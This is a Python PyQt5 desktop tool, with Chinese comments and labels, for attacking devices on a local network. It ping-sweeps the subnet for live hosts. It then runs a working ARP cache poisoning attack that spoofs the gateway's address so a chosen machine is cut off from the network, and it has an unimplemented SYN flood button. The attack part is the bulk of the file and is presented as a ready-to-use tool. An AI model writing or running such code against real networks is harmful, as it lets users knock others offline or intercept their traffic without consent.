import sys, time, re
from pythonping import ping
from multiprocessing import Pool
from qt5.lan_ns_test import Ui_MainWindow
from PyQt5.QtWidgets import QMainWindow, QApplication, QMessageBox
from PyQt5.QtCore import QStringListModel, QThread, pyqtSignal
from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp, conf, ifaces, get_if_hwaddr, get_if_addr


class MyWindow(QMainWindow, Ui_MainWindow):
    def __init__(self):
        super(MyWindow, self).__init__()
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())  # 设置窗口不可调整大小

        self.refreshButton.clicked.connect(self.refresh_lan_alive_hosts_exec)
        self.arpPoisonButton.clicked.connect(self.arp_poison_exec)
        self.synFloodButton.clicked.connect(self.syn_flood_exec)

        self.model = QStringListModel()
        self.model.setStringList([get_gateway_ip(), get_if_addr(get_real_iface_name())])
        self.listView.setModel(self.model)

        self.refresh_host_thread = None
        self.arp_poison_thread = None

        self.arp_poison_thread_working = False

    def refresh_lan_alive_hosts_exec(self):
        # print('refresh_lan_alive_hosts_exec, thread = ', QThread.currentThread())
        self.refresh_host_thread = GetHostsWorkThread()
        self.refresh_host_thread.start()
        self.refresh_host_thread.signals.connect(self.update_model)
        self.refreshButton.setText('搜寻局域网存活主机中...')

    def update_model(self, reachable_ip_list):
        print(('{:20}{}\n' + '-' * 40).format('IPv4地址', '往返时间'))
        # print(reachable_ip_list)
        ip_alive_list = []
        for item in sorted(reachable_ip_list, key=lambda x: x[1]):
            print('{:20}{}'.format(item[0], str(item[1]) + ' ms'))
            ip_alive_list.append(item[0])
        self.model.setStringList(ip_alive_list)

        self.refreshButton.setText('刷新局域网存活主机列表')

    def arp_poison_exec(self):
        print('arp poison btn Pressed')
        if not self.arp_poison_thread_working:
            print('START arp poison THREAD')
            try:
                selected_ip = self.listView.selectedIndexes()[0].data()
            except IndexError as e:
                print(e)
                QMessageBox.critical(self, "错误", "必须首先从列表中选择一个IP地址, 再进行操作!")
                return
            print('selected_ip', selected_ip)
            self.arp_poison_thread = ARPPoisonWorkThread(selected_ip)
            self.arp_poison_thread.start()
            # self.arp_poison_thread.stop_signal.connect()
            self.arpPoisonButton.setText(selected_ip+'将被断网...')
            self.arp_poison_thread_working = True
        else:
            print('STOP arp poison THREAD')
            self.arp_poison_thread.stop()
            self.arp_poison_thread_working = False
            self.arpPoisonButton.setText('ARP缓存投毒（断网）测试')

    def syn_flood_exec(self):
        pass


class GetHostsWorkThread(QThread):
    signals = pyqtSignal(list)

    def __init__(self):
        super(GetHostsWorkThread, self).__init__()

    def run(self):
        # print('run, thread = ', QThread.currentThread())
        # print('run, thread 2 = ', self.thread())  #  这个是正确的打印线程方式
        # print('run, thread 3 = ', threading.currentThread())
        pool = Pool(50)
        result_list = []
        local_ip = get_if_addr(get_real_iface_name())
        for n in range(1, 255):
            result = pool.apply_async(func=my_ping, args=(local_ip[:local_ip.rindex('.')+1]+str(n),))
            result_list.append(result)

        pool.close()
        pool.join()
        # print('all process over!!!!')
        # print(result_list)

        reachable_ip_list = []
        for r in result_list:
            if r.get()[1]:
                reachable_ip_list.append((r.get()[0], r.get()[2]))

        # print("reachable_ip_list=", reachable_ip_list)
        self.signals.emit(reachable_ip_list)
        # time.sleep(3)
        # self.signals.emit([('8.8.8.8', '1.0'),])


class ARPPoisonWorkThread(QThread):
    stop_signal = pyqtSignal()

    def __init__(self, target_ip):
        super(ARPPoisonWorkThread, self).__init__()
        self.target_ip = target_ip
        self.stop_signal = False

    def run(self):
        self.arpcachepoison1(self.target_ip, (get_gateway_ip(), get_if_hwaddr(get_real_iface_name())), 1)

    def arpcachepoison1(self, target_ip, ip_mac_couple_to_usurp, interval=15):
        print('将ip为{}的ARP缓存中的对应项目进行篡改：{}'.format(target_ip, ip_mac_couple_to_usurp))
        ip_to_usurp, mac_to_usurp = ip_mac_couple_to_usurp
        p = Ether(src=mac_to_usurp) / ARP(op="who-has", psrc=ip_to_usurp, pdst=target_ip,
                                          hwsrc=mac_to_usurp, hwdst="ff:ff:ff:ff:ff:ff")
        print(p)
        try:
            while True:
                sendp(p, iface_hint=target_ip)
                time.sleep(interval)

                if self.stop_signal:
                    break
        except KeyboardInterrupt:
            pass

    def stop(self):
        self.stop_signal = True


def get_gateway_ip():
    return conf.route.route('0.0.0.0')[2]


def get_real_iface_name():
    # 从scapy的ifaces命令打印结果里，按行解析每行的属性（第一行为属性行），结果放入字典的列表iface_dict_list
    iface_dict_list, iface_keys = [], []
    for idx, line in enumerate(str(ifaces).split('\n')):
        items_in_line = list(filter(None, re.split(r'\s{2,}', line)))  # 每行里面有2个及以上空格进行分割
        if len(items_in_line) < 2:
            continue
        if idx == 0:
            iface_keys = items_in_line
        else:
            iface_dict = {}
            for i, key in enumerate(iface_keys):
                if i < len(items_in_line):
                    iface_dict[key] = items_in_line[i]
            iface_dict_list.append(iface_dict)
    # 过滤掉一些Name属性中的无关关键词, 应只返回唯一的可用网络接口名(在本人电脑上测试通过)
    ignore_keywords = ['virtual', 'miniport', 'loopback', 'vmware']
    real_iface_list = list(filter(
        lambda iface: all([False if keyword in iface['Name'].lower() else True for keyword in ignore_keywords]),
        iface_dict_list))
    real_iface_name = real_iface_list[0]['Name']
    return real_iface_name


def my_ping(ip):
    # print('pinging '+ip+' start')
    resp = ping(ip)
    # print('-->',resp)
    if 'Reply' in str(resp):
        return ip, True, resp.rtt_avg_ms
    else:
        return ip, False, 999.9


if __name__ == '__main__':
    app = QApplication(sys.argv)
    myWin = MyWindow()
    myWin.show()
    sys.exit(app.exec_())
